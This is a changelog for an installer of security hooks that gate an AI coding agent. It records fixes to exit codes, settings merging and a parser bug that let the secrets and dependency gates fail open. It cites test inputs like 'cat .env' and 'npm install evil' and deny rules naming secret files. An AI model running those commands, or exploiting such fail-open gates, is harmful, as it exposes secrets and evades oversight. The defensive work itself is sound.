the `exactly 13` pin reads `body(AUTO)` only. It is stronger than that:
`Bootstrap-Protocol-v2-8-0.md:283` already says *"successful per-task
terminations (`max-iterations`, `goal-condition-suspect`, `terminal-success`)
do not produce a queue-level `exit_reason`"*. For `loop.sh`/`goal-loop.sh` there
was never a contract question at all.

**The blast radius was one log line.** Executed against the emitted skeleton:
`auto.sh` writes **no** `queue_runs_history` entry and no run-summary. The
pessimistic `EXIT_REASON` escapes only through the exit trap, into `hooks.log`.
No durable record was ever corrupted.

So the decision is **no 14th value** — because every enum value answers *why a
RUN ended*, and "the dispatch loop was never written" answers *why no run
started*. A 14th value would have put an authoring state into a run-outcome
vocabulary, and propagated through both protocol docs, the Companion and the
pin to do it. The wrappers now set a `REFUSAL` and log `REFUSED: <cause>`,
claiming no enum value:

```
auto.sh REFUSED: dispatch loop not implemented rc=1
loop.sh task=T-1 REFUSED: no task file for T-1 rc=1
```

**Acting on it found a live defect nothing had predicted.** The per-task
wrappers were reporting `goal-condition-suspect` for a **missing task file**, an
**ineligible task** and an **already-claimed task** — the same category error as
the skeleton, not confined to the skeleton, and on `loop.sh` it named a goal
condition on a wrapper that has no goal. Executed before the fix:
`loop.sh task=T-1 exit reason=goal-condition-suspect rc=1`, for a task that did
not exist. All three now refuse by name. `goal-condition-suspect` is left to
mean what the protocol says it means, set by the operator's completed loop.

`manual-halt-sentinel` is deliberately **retained** as a reason on the halt
paths: a halt sentinel genuinely was observed, so that one names a real cause.
The rule is not "refusals log differently" but *a reason must name a cause that
happened*.

**P-9 — eight refusal causes, one exit code — resolved as: keep one code.**
`0` = the run ended, see `exit_reason`; `1` = refused, see `REFUSED`. The 0–255
space is already spoken for at 126 (found, not executable), 127 (not found) and
128+n (killed by signal n), and `auto.sh` itself exits 130 on SIGINT, so a
custom code map risks colliding with shell convention — and executed, **no
mechanical consumer of a wrapper's exit status exists anywhere** in the repo or
the emitted tree. `auto.sh`'s header now enumerates the eight causes and states
that an operator-completed implementation MAY subdivide, and should document its
map there if it does.

**Golden re-baseline: freeze-exception no. 30**, `full_autonomous` only — and
unlike 28 and 29 this one is **not** comment-only; it changes emitted behaviour.
Verified per-file before re-baselining: exactly three bodies move (`auto.sh`,
`loop.sh`, `goal-loop.sh`), action count stable at **69**, 0 added, 0 removed,
and `default` + `design_steering` are **byte-identical** — they emit no
wrappers, which is why only one of the three digests moves. The exactly-13 pin
is untouched and still passes; no protocol document changed.

Suite: 21 suites / 1905 checks / 0 failed.


## 2.6.0 in-version fix — two version numbers that never existed (2026-07-31)

The tree carried **33 citations of `v2.6.1` and `v2.6.2`**, versions that were
never tagged. `git blame` resolves them cleanly and consistently — whoever wrote
them was disciplined about it — but to *development batches*, not releases:

```
v2.6.1  the two-lens adversarial-review batch, and the dependency-gate
        regression repair            4cc9742, 311bd67          2026-07-28
v2.6.2  the round-2 review and its remediation
        0fba4d2, fac2897, 9952741, edac7c7, ff435f5             2026-07-29
```

**Every one of those commits is an ancestor of the `v2.6.0` tag** (`f6bded0`),
so all the work these labels describe already shipped in v2.6.0. They were
written mid-cycle expecting the batches to tag separately. They did not.

**Twelve of the 33 were EMITTED** — 3 in `dependency-gate.sh`, 4 in
`secrets-gate.sh`, 5 in `sdk_gates/gates.py`. An operator on a v2.6.0 install
(`PROTOCOL_VERSION = "2.6.0"`, the only version there is) opening a security
gate read *"the v2.6.2 optimization pass optimized CANDIDATES and left…"* and
would conclude they were two versions behind on that gate, then go looking for
an upgrade that cannot be obtained. That is §4.5's class — an advertised state
that does not match the artifact — inside the controls themselves.

Labels now name the batch (`[round-2 review]`, `two-lens`). Retired rather than
resolved-to-a-tag on purpose: **tagging `v2.6.1` later would have made these
worse, not better**, turning a dangling reference into a plausible one that
points at a real version containing something else entirely.

**Golden re-baseline: freeze-exception no. 29**, all three fixtures,
**COMMENT-ONLY**. Verified per-file before re-baselining: exactly **three**
bodies move on each fixture — `dependency-gate.sh` (6 lines), `secrets-gate.sh`
(8), `sdk_gates/gates.py` (10) — action counts stable at **57 / 69 / 59**, 0
added, 0 removed, every differing line a comment, and nothing else in the
emitted tree differs. Unlike no. 28, **`gates.py` does move here**: five of the
labels lived in `lib/sdk_gates_template.py`.

Suite: 21 suites / 1905 checks / 0 failed.


## 2.6.0 in-version fix — the knowledge base described itself wrongly (2026-07-31)

The security KB (`docs/agentic-harness-security-kb.md`) is the artifact that
framed the last review: that brief opened by citing §5.1, and the framing is why
the round attacked the fix's own bound instead of re-testing the four fixes it
shipped. `3ba205a` amended it with **P0-3d** — a fourth parsing fail-open, in the
*selector* rather than the parse. Two adversarial passes over that amendment then
found nine defects, **all of them in the document's own claims, none in the code
it describes.** Merged as PR #24.

**§7's brand-new checklist item asserted a deny that does not happen.** It
claimed a shim, a broken dynamic link, a non-executable file *and a same-named
different tool* all route to the same deny as an absent dependency. Executed
against the emitted install: the first three deny (`rc=2`); the fourth
**allows**. `jget` accepts any parser that exits 0, so anything named `jq` that
exits 0 without producing a parse reads as a clean *empty* parse and the `case`
falls through. This is the §6.D failure class in the document that names it — a
normative item that was false the day it was written. The item now states the
gap; the gap is backlog **P-19**.

The realistic substrate is not an exotic tool. It is a defensive wrapper —
`real-jq "$@" 2>/dev/null || true; exit 0` — over a jq that is broken: the same
`|| true` idiom the P0-3d fix removed from `jget`, one layer out, in a file the
operator owns. Bounded by execution: a swallowing wrapper over a *working* jq
and a banner-prepending wrapper both **deny**, so the gap is narrower than "any
wrapper".

**"Eight consecutive fix batches" was a count of COMMITS, relabelled.** The
round-4 brief established six over commits and its three reviewers confirmed it;
the round-5 brief warned in terms that re-deriving it *"from batches produces a
different, worse-supported number"*. It was relabelled "batches" anyway at a
checkpoint that also incremented it, then carried to seven and eight without
anyone re-deriving anything. Restored to **seven commits**, enumerated from the
three records that state the membership explicitly and reconcile exactly.

**The first replacement enumeration was itself wrong** — right count, wrong
membership. It was rebuilt from commit *subject lines*, which included a commit
outside the counted window and omitted `fac2897` entirely, because that one is a
`test(gates):` commit and the eye skips it when scanning for `fix(`. An
enumeration built from what a commit calls itself is the same error as a count
built from what the last document called it.

**Also corrected.** `set -o pipefail` was described as *"what makes the
pipeline's status the parser's, not `printf`'s"* — backwards: the parser is the
last command, so that holds already by plain POSIX (executed: pipefail off,
parser exits 127, substitution `rc=127`); pipefail adds the reverse, surfacing a
failed producer. The delta is **fourteen** defects, not thirteen — wrong in six
places since the file was created, against a table that has never had thirteen
rows; the counting basis is now stated once in §2 so it cannot drift.
*"Green throughout at 1895 checks"* named a count belonging to `5510889`, the
pre-rebase form of the batch, which is not in `main`'s history — measured across
the window the suite ran 1828 → 1835 → 1905. §4.6's five-row table is now
labelled EXECUTED with its evidence, and `command -v` is split from `which`,
which disagree on a `chmod 644` file. `pyenv` was the wrong manager for a `jq`
shim; asdf and mise carry jq as a first-class tool.

**Golden re-baseline: freeze-exception no. 28**, all three fixtures,
**COMMENT-ONLY** — two corrections to the `jget` comment block in the emitted
hook header (the `pipefail` account, and the shim example). Verified per-file
*before* re-baselining, which is the discipline this ledger exists for:
**11 / 15 / 11** bodies move, action counts stable at **57 / 69 / 59**, 0 added,
0 removed, every moved body under `.claude/hooks/`, and every differing line in
every moved body is a comment. `sdk_gates/gates.py` is byte-identical — the SDK
parses in-process and never had this defect.

**§6.D corrected, because it taught the defect.** Two items were framed entirely
on the parser being *absent*: *"Fails closed when the parser is missing"*, and
*"Confirm `jq` is installed … fall back to Python's `json` module if not"* — the
second being the `elif have_py` bug written as instruction. §6.D is normative, so
an author conforming to it wrote P0-3d and it looked like conformance. Both now
turn on the parser **failing**, not on its absence. Same correction in
`Bootstrap-Protocol-Companion-v2-8-0.md`.

Suite: 21 suites / 1905 checks / 0 failed, unchanged throughout.


## 2.6.0 in-version fix — the skeleton wrappers reported terminal success (2026-07-31)

The first round that ever **executed** the emitted autonomous-mode wrappers
rather than reading them. Four defects, all in artifacts three prior rounds had
covered by byte assertion only.

**1. A run that dispatched nothing reported success.** `auto.sh` set
`EXIT_REASON="queue-empty"` and exited **0** — and its own emitted enum defines
`queue-empty` as *"all ready-to-run tasks completed … (terminal success)"*.
`loop.sh` and `goal-loop.sh` did the same with `max-iterations`. The refusal was
loud on stderr and invisible everywhere else: under `nohup`, cron, or any
supervisor reading `$?`, a skeleton that did no work was indistinguishable from
a clean overnight run, and the morning-after summary's "Ended because" line —
which keys off the code, not the text — would have said the backlog emptied.
All three now keep their pessimistic default and exit non-zero.

The 13-value enum is deliberately **not** extended. A `skeleton-not-implemented`
value is contract surface (pinned at exactly 13, documented in `auto.sh`'s
header, rendered by the morning-after summary), so it is an owner decision
rather than part of a defect fix — recorded as backlog **O-3**, along with the
honest cost: `infrastructure-failure` is defined in that same enum as *"two
consecutive runner-level failures"*, and the skeleton now records it on a first
run with zero failures. Safe in direction, still wrong in cause.

**2. The iteration-summary demand could not block.** Per 6.D, exit 1 is "hook
error, tool proceeds"; on a `Stop` hook exit **2** means "do not stop". The gate
spent its whole life exiting 1 for the one violation it exists to catch, while
its stderr claimed to be "feeding error to next iteration" — where exit 1's
stderr reaches nobody. Now exits 2.

**3. …and that block needed a bound, which took three attempts.** `exit 2` on a
Stop hook means an agent that cannot produce a summary is refused the end of its
turn — an unbounded stop-loop inside an unattended run, strictly worse than the
inert gate it replaced. The bound is `stop_hook_active`, and getting it right
was the hard part:

* the first cut read it with a bare `[ "$(jget …) " = true ]`. `jget` routes a
  missing parser through `hook_fail`, whose `exit 2` dies with the **command
  substitution** rather than the script — so on a parserless host the guard read
  empty, the bound could never fire, and the hook blocked every Stop forever.
  The fixed defect's own class, re-entering through the fix;
* the second cut tested `have_jq || have_py` and degraded to allow. The
  adversarial round showed that is still a **presence** test: with a
  broken-but-present `jq` the guard took the true branch, the bound read empty,
  and the hook blocked every Stop (executed: pre-fix `rc=1`, post-fix `rc=2`,
  with the degrade message never printed). Fixed at the root in the entry below
  — `jget` now falls back on failure, not only on absence — and the local guard
  is a parser **self-test** so the two layers cannot disagree.

Degrading to allow is deliberate: on a `PreToolUse` gate fail-closed means deny,
but on a `Stop` hook refusing forever is the unsafe direction. This hook
enforces iteration discipline, not a security boundary. §6.C's
`summary_failure_count` and three-failure halt remain unimplemented (**O-2**):
that counter is per-task persistent state the Stop payload cannot scope, so it
belongs in the operator-completed wrapper, not here. The bound shipped is the
local one — never spin a single turn.

**4. The tier-3 cooperation point could never fire.** `ls A B` with one
unmatched glob exits non-zero, so `ls .loop-active-* .goal-active-*` required
**both** modes active simultaneously. A task is in exactly one mode, so the
branch was dead in normal operation — and would have stayed dead after an
operator implemented tier-3, which is the completion path it exists to serve.
Split into two tested globs, OR'd.

**Two emission bugs closed alongside** (backlog **D-9**, **I-8**): a
`.format`-doubling quirk made `log()` in `loop.sh`/`goal-loop.sh` emit a literal
`\n`, so their `hooks.log` entries shared one physical line, and the
`O_CREAT|O_EXCL` claim sentinel was written with the same doubled escape. D-9's
own row was wrong about where the bug was — it named `loop.sh` as *correct*, so
a fixer working from it would have fixed one of the two sites. Verified by
execution: seven wrapper log entries, seven physical lines.

**On the tests.** Four pre-existing checks asserted `rc == 0` on the skeleton
path — the defect encoded as the expectation. They were rewritten rather than
deleted, and the adversarial round then found two of the rewrites were vacuous:
`test_installer.py`'s F-2 became `r.returncode is not None`, which cannot fail
and which converted a live flock-less red into a permanent green; and the new
`stop_hook_active` ordering check compared `str.find()` results with no lower
guard, so `-1 < 28191` passed when the bound was deleted outright. Both now
assert the refusal code and reason.

`tests/test_wrapper_behavior.py` is new — 65 checks, demonstrated to fail
against the pre-fix templates — and it no longer reports `0 passed, 0 failed`
on a host without `flock` (stock macOS ships none). It emits `SUITE SKIPPED:`,
which `bin/run-tests` renders as SKIPPED on the table, the totals line and the
closing banner. A suite that declined to run has not passed, and the instrument
added because *"a green suite sat on top of all four defects"* must not be able
to disappear quietly.

**Golden re-baseline: freeze-exception no. 27**, `full_autonomous` only —
exactly five files, action count stable at 69, `default` and `design_steering`
byte-identical, each of the five read byte by byte. Numbered 27 rather than 19:
19 was already spent, and the duplicate would have made the changelog's existing
no.-19 paragraph resolve to the wrong re-baseline (backlog **D-8** records that
this ledger's numbering has drifted before).

Residue this round recorded rather than fixed is backlog cluster **O**.
Suite: 21 suites / 1905 checks / 0 failed.

## 2.6.0 in-version fix — a broken `jq` failed every gate open (2026-07-31)

`jget` picked its JSON parser by asking whether one **exists**, not whether one
**works**, and then swallowed the answer.

```bash
if have_jq; then   ... jq  ... 2>/dev/null || true
elif have_py; then ... python3 ... 2>/dev/null || true
```

`have_jq` is `command -v jq`. It reports success for a `pyenv`/`asdf`/`mise`
shim that prints "command not found" and exits 127, for a jq whose dynamic
link is broken (`libonig.so.5` — the Alpine/slim-image shape), and for a
non-executable file of the right name. In every one of those cases jq ran,
failed, `|| true` erased the failure, `jget` returned **empty**, and each gate's
`case` fell through to **allow**. The `elif` is the second half: a working
`python3` on the same PATH was never reached, because the selector had already
committed on presence.

Executed against the emitted artifact, jq exiting 127 with python3 present:

| gate | command | before | after |
|---|---|---|---|
| `secrets-gate` | `cat .env` | **rc=0** (allowed) | rc=2 |
| `dependency-gate` | `npm install evil` | **rc=0** (allowed) | rc=2 |

Both silent — no stderr, and `hooks.log` recorded only the misleading
`secrets-gate: no path`.

This is upstream **P0-3b reopened through the selector**. P0-3b closed "neither
parser installed"; a parser that is installed and does not work is the case a
presence test reports as success, and the header's own comment — *"a security
substrate must never degrade to allow"* — was written directly above the code
that did.

**The fix.** Try each parser in turn and accept its output only if it exited
clean; `set -o pipefail` is what makes the pipeline's status the parser's
rather than `printf`'s. Both parsers unusable is now the same condition as
neither installed: `hook_fail`, which is fail-closed for a blocking gate and a
logged degrade for an advisory one. `local out` is declared on its own line —
`local out="$(...)"` would mask the substitution's status behind `local`'s,
which is a variant of the same bug.

**Why it survived.** `tests/test_hook_behavior.py` built symlink farms for jq
**absent** and for **no parser**, under a comment reading "`command -v jq`
cannot be fooled by shadowing". That is true and it is the wrong question:
nothing was shadowing jq, it was broken, and no farm ever built a parser that
exists and fails. `_broken_farm` now does, in all three shapes.

7 checks in `tests/test_hook_behavior.py` (`P0-3b(ii)`), 5 of which were
demonstrated to fail against the pre-fix header. **Freeze-exception no. 26**:
all three golden fixtures move, because the change is one function in the
shared `_HOOK_HEADER` that every hook body carries — 11/15/11 bodies, action
counts stable at 57/69/59, nothing added or removed, and every moved body
under `.claude/hooks/`. `sdk_gates/gates.py` deliberately does not move: the
SDK substrate parses in-process and never had this defect.

Found by the adversarial round on `fix/autonomous-mode-exit-contract`, which
hit the same selector defect in that branch's new `stop_hook_active` bound.
Fixed here at the root instead, so that branch inherits it.

## 2.6.0 in-version fix — a replaced symlink is now announced, not swallowed (2026-07-29)

The inconsistency named as "not fixed" two entries below, closed on the half
that was actually wrong.

A planned path may be a symlink the operator put there — steering docs or hooks
kept in a shared dotfiles repo. `settings.json` declines that at rc=3; every
other planned path replaced it at rc=0 with no backup and no mention.

**What the fix is not.** It does not extend the decline. Re-checking the
round-6 F5 rationale against an execution shows its load-bearing half does not
transfer: the decline exists because *writing through* a shared file would give
every other project `$CLAUDE_PROJECT_DIR/...` commands it cannot run — and the
generic path is `os.replace`, which swaps the **link** for a regular file and
never writes through it. The link target keeps its bytes. So the shared-file
harm is structurally absent there, and the only real defect was **silence**:
the operator's target quietly stopped being used and nothing said so.

**What changed** — reporting only, behaviour identical:

* the per-file line names the link and its target;
* an end-of-run block repeats it, because a line buried mid-transcript is not
  a signal — a SKIP on stdout line 29 of 60 is precisely how the original
  unenforced-tree defect went unnoticed;
* `--dry-run` reports it in the **future** tense, before anything is written,
  so the warning arrives while it is still actionable;
* the manifest records `replaced_symlink`, so the displaced target is still
  findable once the transcript is gone. `--uninstall` removes what was written
  and does **not** re-create the link; that is stated in the message.

A path the run does not rewrite is left alone and says nothing, and a tree with
no symlinks gains no new output at all — both pinned, so this cannot become
noise on ordinary installs.

Whether a symlink should *block* an install is left open as
`docs/deferred-backlog.md` **L-1**, deliberately: it is a per-kind judgement.
A symlinked hook script has a real argument for declining; a symlinked steering
doc mostly just blocks installs. Deciding it uniformly here would settle an
owner question by drive-by — the specific criticism an earlier round already
earned. **L-2** records the other honest gap: the legacy-manifest migration
path was reasoned through and never executed.

12 checks in `tests/test_wiring_verification.py`. No emitted body moves and no
golden digest shifts — the change is confined to the transcript and the
manifest.

## 2.6.0 in-version fix — five checks asserted a property of the developer's machine (2026-07-29)

The second of the two causes behind the red CI below, and the one that kept it
red after the first was fixed.

`_runtime_floor_check` (AC-9-4) writes to stderr when the Claude Code CLI is
absent from PATH or below `RUNTIME_FLOOR`. That is deliberate, and its
docstring says so: *"Never fatal … but never silent either."* It is a property
of the **machine**, not of the install.

Five assertions spelled the enforcement contract as `stderr == ""`. On a
developer box with the CLI on PATH that holds. On a CI runner, which has no
Claude Code CLI, the installer correctly emits its advisory and all five fail.
The suite was asserting "this machine has the CLI installed" without meaning
to.

Fixed in the tests, not the installer: silencing a deliberate safety advisory
to make a test pass would be the wrong direction, and adding an opt-out
env var would put a switch on exactly the warning that is documented never to
be silent. A `stderr_sans_floor()` helper drops lines beginning
`WARNING: Claude Code ` and asserts on the remainder — which is what these
checks always meant: *the installer reported nothing of its own.*

The helper is deliberately narrow, and that is verified rather than asserted:
with the escape defect below restored, these five checks still **fail**, so
the filter cannot mask the class of bug it sits next to.

### Why this took two rounds to see

The two causes were invisible in different ways, and both hid behind the same
green local run:

* `bin/run-tests` sets `PYTHONDONTWRITEBYTECODE=1` so suites cannot litter the
  tree. That stops a `.pyc` being *written*, but an existing one is still
  *read* — so a working checkout, which has `lib/__pycache__` from any earlier
  direct `python3` run, never recompiles the template and never sees its
  warning. A fresh CI checkout has no cache and, with writes disabled, never
  gains one, so **every** subprocess compiles and warns.
* The floor advisory needs the Claude Code CLI *absent*, which never happens on
  the machine the tests were written on.

Reproducing CI locally therefore needs both: `__pycache__` removed **and**
`claude` off PATH. Under those two conditions the suite now reports 20 suites,
1816 checks, 0 failed; reverting either fix alone puts it back to 7 and 5
failures respectively.

## 2.6.0 in-version fix — the SDK template warned on every fresh checkout (2026-07-29)

CI had been red on every commit of this branch, on five assertions all reading
*"… writes nothing to stderr"*. This was **one of two independent causes** —
the second is the entry above, and fixing this one alone left CI red. Both were
real, and the reason this one went unnoticed is worth recording.

`lib/sdk_gates_template.py` carries the whole SDK gate module inside two
**non-raw** `'''…'''` strings. A bare `\S` in the template body is therefore an
invalid escape in the OUTER string as well as the inner one — eight of them,
across five lines, including the very docstring that says *"the `r` prefix is
load-bearing"*. Compiling the file emitted `SyntaxWarning` to stderr, so a
clean install violated its own stated contract.

Round-4 D10 fixed this one layer down: it hardened the **emitted** module and
added two checks that compile the **rendered** source, one of them under
`-W error::SyntaxWarning`. Nothing compiled the **template file itself**, so
the identical defect survived in the file that generates the thing that was
fixed — the same shape as the round-7 finding below, where a type check
existed at one end of a value's journey and not the other.

It stayed invisible locally because a working checkout has a warm
`__pycache__`: the file is never recompiled, so the warning never fires. CI
checks out fresh. Every local run showed 0 failed while CI showed 5.

Fixed by doubling the eight escapes. In a non-raw string `\\S` and `\S` both
render as `\S`, so **`_HEADER` and `_STATIC_BODY` hash byte-identical to before
and no golden digest moves** — verified, along with a full emitted tree diffed
file-by-file. One source line goes to 81 characters; it is a comment *inside*
the template, so rewrapping it would change the emitted `gates.py`. The file
already carries five longer lines.

Two regression checks in `tests/test_sdk_gates.py`, both confirmed to fail with
the defect restored: the template file py-compiles under
`-W error::SyntaxWarning`, and importing it with a genuinely **cold** cache
writes nothing to stderr. The second imports a COPY at a path Python has never
cached — the first version of that check read the `__pycache__` the test file
had populated at its own import and passed with the bug present, which is the
warm-cache blindness that let this live in the first place.

## 2.6.0 in-version fix — the ownership key crashed on the shapes it was built to tolerate (2026-07-29)

Round-7 review of the previous entry found two defects. Both are the same
shape as everything before them — *the code that exists to stop the installer
destroying operator content, failing on operator content* — and both were
found by executing shapes, not by reading. The suite was green at 1782 checks
through both.

* **A `matcher` the installer cannot key aborted the run.** Ownership is keyed
  on `(event, matcher, command)`, and that tuple is hashed against a set. Two
  of its three elements come out of the operator's file, which may carry any
  JSON at all: a `matcher` that is a list or an object is **unhashable**, and
  the lookup raised `TypeError` straight out of `apply_plan`. The install
  aborted after 22 of 58 files — every hook script on disk, `settings.json`
  untouched, so **not one gate registered** — with no manifest, so
  `--uninstall` then reported "nothing removed" and left all 23 files. Worse,
  the same lookup runs in `_uninstall_settings_merge`: an operator who added
  such a group *after* a healthy install could not uninstall at all, at rc=1,
  with no remedy but hand-editing the file. Both reproduce with
  `{"matcher": ["Write", "Edit"], …}`; both worked at `844b8e0`, so this was a
  regression introduced by the fix for round-6 F2.

  `_split_owned_hooks` already type-checked this exact triple arriving from
  the manifest — that check was added in the same commit, for the same reason.
  Nothing checked it arriving from *their* file. The new `_is_ours_here`
  applies one rule at both ends: we only ever emit a string `command` under a
  string-or-absent `matcher`, so a site we cannot key is by construction not
  ours and is left alone — which is what `_merge_hooks` already promised for
  anything it could not parse. This also fixes an unhashable `command`, which
  crashed identically and was pre-existing at `844b8e0`.

* **`displaced_keys` was decided by a proxy that was false whenever it fired.**
  `_displaced_owned_keys` treated "the manifest row carries a whole-file
  digest" as "we owned this file wholesale, so it displaced nothing". But that
  function is reached only from the MERGE branch, and the merge branch is
  reached only when the file on disk is *not* ours wholesale — so the
  condition was never true where it was tested. A decline records the
  **operator's** digest under `skipped-local-edit`, so a `settings.json` the
  installer had *refused to touch* read back as one it owned outright: every
  top-level key of theirs was dropped from the record as `{}`, carried forward
  as a decision on every subsequent run, and then **deleted** by
  `--uninstall`. Every decline was a trigger, including the symlink decline
  added in the entry below — declining is the correct action there, and it
  still cost the operator their `$schema`. `--force` over their file, followed
  by an operator edit, lost them the same way.

  The proxy is gone. `displaced_keys` is now recorded by **every path that
  writes** — `{}` on a create (there was no file, so nothing was displaced),
  derived from the file on disk at the moment a wholesale write replaces it,
  and carried forward through a decline rather than re-decided by one. A row
  with no record at all now means only what it says: no run has decided yet,
  so derive one — and deriving is now only ever reached for a file this
  installer has never written. Absence and `{}` are different answers, and the
  difference is load-bearing.

  Deriving still happens on a genuinely record-less tree (a manifest lost with
  a fresh clone). There it now also excludes a `_generatedBy` carrying our own
  generator name at *any* protocol version: the value is version-stamped, so
  an equality test against this run's emission read the previous release's
  stamp as the operator's and handed it back at `--uninstall` — installer
  residue, and a violation of "removes exactly what it created".

Regression tests: 32 new checks in `tests/test_settings_merge.py`, the two
sections this suite was missing. Every `matcher` fixture in it was a string,
and nothing merged a tree whose previous run had declined — the two gaps the
defects sat in. A fresh install remains byte-identical to `f1ed58c`; the merge
is still a fixed point over three runs; the round trip on a messy operator
file is still exact.

### Not fixed — an inconsistency worth naming

The symlink decline below applies only to `settings.json`. A symlink at any
other planned path is skipped while it is untracked, but once tracked it is
silently replaced by a regular file at rc=0, with no backup and no mention —
`os.replace` swaps the link rather than writing through it, so the target's
bytes survive but the link does not. The mechanism is pre-existing at
`f1ed58c`; the inconsistency with `settings.json` is new, and the decline's
own rationale ("neither orphan nor edit") applies verbatim. Left as an owner
decision rather than widened on a drive-by.

## 2.6.0 in-version fix — the merge claimed content it did not add (2026-07-29)

*(Amended to fold in the two owner decisions, F5 and F6 — see below.)*

Round-6 review of the co-owned `settings.json` merge found four defects, three
of them the same shape as the four that preceded them: *the code that exists
to stop the installer destroying operator content, destroying operator
content.* All four were found by executing shapes, none by reading.

The root cause of the first two is one sentence: **ownership was recorded as
what the installer EMITS, not as what the run actually ADDED.** Anything the
operator had written first and we happened to emit too was adopted, and then
retired on their behalf.

* **A deny rule we both carry was treated as ours.** `Read(.env*)` is a rule
  a security-conscious operator writes themselves — and one `never_read_paths`
  emits. Recording it as ours deleted it twice over: once at `--uninstall`,
  and once on any re-apply that narrowed `never_read_paths`, at rc=0 beneath a
  line reading "operator settings untouched". `_merge_settings` now reports
  only rules *not already in their file*, and leaves their rules in their
  original positions so the round trip returns the list unchanged. The same
  defect applied to the keys we own outright: an operator's own `$schema`
  (or `_generatedBy`, or `_note_mcp`) was overwritten at install and **deleted**
  at uninstall. Their values are now recorded in the manifest as
  `displaced_keys` and handed back. Where there is no record to carry — a
  manifest lost with a fresh clone, or one written before this key existed —
  the value is re-derived from a file that already holds ours, so a key equal
  to our own emission is deliberately *not* claimed: taking it at face value
  left `_generatedBy: bootstrap-installer` in the operator's file after an
  uninstall that claimed to remove everything it created. The residual runs
  the other way and is far smaller — an operator whose `$schema` is
  byte-identical to ours loses that one key.

* **Hook ownership was per COMMAND; it is now per SITE.** An operator may
  deliberately widen one of our gates by registering our script at an event or
  matcher we do not emit — `secrets-gate.sh` under `SessionStart`, or under
  `PreToolUse`/`WebFetch`. Command-keyed ownership dropped every registration
  of our scripts anywhere in the file and re-added them only where we emit, so
  that widening vanished silently: rc=0, empty stderr, and `verify_wiring`
  structurally could not see it (the command was still registered *somewhere*).
  `owned_hooks` now records `[event, matcher, command]` triples. The old
  bare-command shape is still read: such an entry is retired only when the
  emission no longer carries that command at all, since its file is being
  deleted and a surviving registration would dangle at rc=127.

* **`verify_wiring` cried wolf on healthy installs.** A hook `command` is a
  shell command line, not a path. `$CLAUDE_PROJECT_DIR/.claude/hooks/fmt.sh
  --fix` — an ordinary operator registration, script present and executable —
  was resolved to the path `".claude/hooks/fmt.sh --fix"`, found absent, and
  reported as a dangling reference. Every install on such a project exited 3
  with "Do not treat it as installed", and `plugin/commands/bootstrap-apply.md`
  acts on that exit code, so the operator was told a good install had failed.
  The exit code this change added is only worth having if it is quiet when
  nothing is wrong. Commands are now tokenised **the way the shell tokenises
  them** and only the first token resolves; a genuinely missing script is
  still reported, now named by path rather than by command line. `shlex.split`
  alone was not enough — it does not terminate a word at `;`, `|`, `&&` or a
  redirection, so `hook.sh; echo done` still resolved to a non-existent
  `hook.sh;`, and turning on `punctuation_chars` to fix that moves the same
  false alarm to `#`, which `shlex` reads as a comment and `sh` does not.
  Both settings, verified token-for-token against `sh` across nine forms.

* **Every refusal blamed `permissions`.** Three of the four unmergeable shapes
  were misdiagnosed, two of them naming a key the operator's file did not
  contain. `_settings_unmergeable_reason` now returns the actual cause and the
  type it found. This matters more than a wording nit: the only remedy the
  message offers is `--force`, which replaces the whole file.

**What the tests could not see, and why.** Every operator fixture in
`test_settings_merge.py` was chosen *disjoint* from what the installer emits —
deny rules like `Bash(rm:*)` that we never produce, hook commands like `mine`
that name no script of ours. The check literally named *"the operator's own
deny rule is untouched"* passed because its rule was one we never emit. Three
live defects lived in the overlap, invisible to a suite that never created
one. There is now a section that only creates overlaps.

**Blast radius.** `_merge_hooks`, `_merge_settings`, `_uninstall_settings_merge`,
`verify_wiring` and the decline path; `build_plan` untouched, so a fresh
install is still byte-identical to `f1ed58c` (verified by `diff -r` of both
trees, not by trusting the golden suite). 20 suites, **1731 → 1756 checks**,
0 failed; corpus HOLD 275 · LIVE 0 · OPEN 4 · REGRESSION 0 · SKIP 3.

### The two owner decisions, now made

Round-6 left two findings open because they needed a decision rather than a
patch. Both are decided and implemented here.

**F5 — a symlinked `settings.json` is declined, not resolved.** It used to be
replaced by a regular file, orphaning whatever it pointed at. Writing *through*
the link was the obvious alternative and is worse: a `settings.json` shared
between projects would gain `$CLAUDE_PROJECT_DIR/...` hook commands that
resolve per-project, so every *other* project sharing that file would run
scripts it does not have and get `rc=127` on every matching tool call. Neither
outcome is the installer's to choose, so it declines, names the link target in
the SKIP line, and exits 3. `--force` remains the way through and still writes
a backup of the content.

**F6 — `--adopt`, plus a diagnosis that does not overclaim.** The manifest is
gitignored, so a clone carries every file this installer wrote and no record
that it wrote them. Every one then reads as the operator's, and a config change
made the skip permanent at rc=3 with `--force` — whose warning says it destroys
what you put there — the only way out. Two changes:

* `--adopt` records files at planned paths as installer-owned and **writes
  nothing**. The operator uses it to say "these are an earlier install's
  artifacts, not my work"; the next ordinary run sees a matching digest and
  updates them normally. It is refused alongside `--force`, since they mean
  opposite things and silently letting one win is how you end up with the
  destructive one.
* A skip on a tree with **no manifest at all** no longer claims the file is
  "pre-existing and not installer-generated" — that is an authorship claim the
  installer cannot support, and it is exactly wrong in the clone case. It now
  says what is known. The old wording is still used where a manifest exists and
  simply does not list the path, which is the one case that justifies it.

Committing the manifest would fix the root cause and was rejected: it is in the
plan, so it moves every golden digest and triggers the `GOLDEN_UPDATE=1`
re-baseline plus a freeze exception, and it carries a timestamp, so it would
churn on every install and conflict in teams.

### Two ambiguities, resolved in opposite directions on purpose

When a rule or a key is in the operator's file and we emit it too, there is no
fact that says whose it is. The two cases are resolved the opposite way, and
the reason is the harm, not the logic:

* **A deny rule already in their file is THEIRS** — so uninstall leaves it.
  Deleting an operator's `Read(.env*)` is the defect above; a deny rule left
  behind is restrictive and safe. The cost is paid on manifest loss: with no
  record, every rule reads as pre-existing, so `owned_deny` is empty and
  `--uninstall` leaves all twelve of ours in place. Residue, in the safe
  direction, and visible.
* **An owned KEY holding exactly our value is OURS** — so uninstall removes
  it. `_generatedBy: bootstrap-installer` left in an operator's settings.json
  is unambiguous installer residue and makes `--uninstall` dishonest, which
  outweighs the narrow case of an operator whose `$schema` is byte-identical
  to ours.

### Known, unfixed

A merged `settings.json` is rewritten through `json.dumps(indent=2)`, so an
operator's own indentation is normalised and non-ASCII values are re-escaped
(`bär` → `bär`). The result is JSON-equivalent and no content is lost —
the round trip is exact when parsed — but it is not byte-for-byte for a file
whose formatting differed. At `f1ed58c` the file was skipped and never
reformatted, so this is new; it is cosmetic, and left as an owner decision.

## 2.6.0 in-version fix — `--force` is recoverable (2026-07-29)

`--force` is the documented escape hatch and the emitted SKIP line points
operators straight at it, so it gets used. It was also irrecoverable: review
